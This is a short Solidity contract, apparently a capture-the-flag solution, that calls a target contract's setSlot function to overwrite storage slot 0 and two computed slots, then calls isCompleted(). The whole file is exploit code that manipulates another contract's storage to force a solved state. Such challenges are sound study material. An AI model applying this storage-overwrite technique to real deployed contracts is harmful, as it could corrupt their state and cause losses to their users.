//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./1.sol";
contract Attract{
    stringer str;
    constructor(stringer addr) public {
        str = addr;
    }
    function getstorageindex() public returns(bytes32){
        return keccak256(abi.encodePacked(uint256(1)));
    }
    function attract() public {
        str.setSlot(bytes32(uint256(0)), 0x000000000000000000000000000000000000000000000000000000000000000a);
        str.setSlot(getstorageindex(), 0x0000000000000000000000000000000000000000000000000000000000000000);
        str.setSlot(bytes32(uint256(getstorageindex())+1),0x0000000000000000000000000000000000000000000000000000000000000000 );
        str.isCompleted();
    }
}